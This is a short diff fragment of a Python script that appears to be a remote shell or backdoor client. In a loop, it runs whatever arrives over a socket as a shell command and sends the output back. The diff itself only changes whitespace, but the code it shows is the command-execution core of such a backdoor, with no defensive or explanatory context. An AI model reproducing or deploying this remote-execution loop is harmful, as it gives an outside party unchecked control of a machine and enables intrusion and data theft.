@@ -15,6 +15,4 @@ while True:
 	else :
 		command = subprocess.Popen([received_data],stdout=subprocess.PIPE,shell=True).communicate()[0]
 		client_socket.send(str(command))
-
-
-
+		
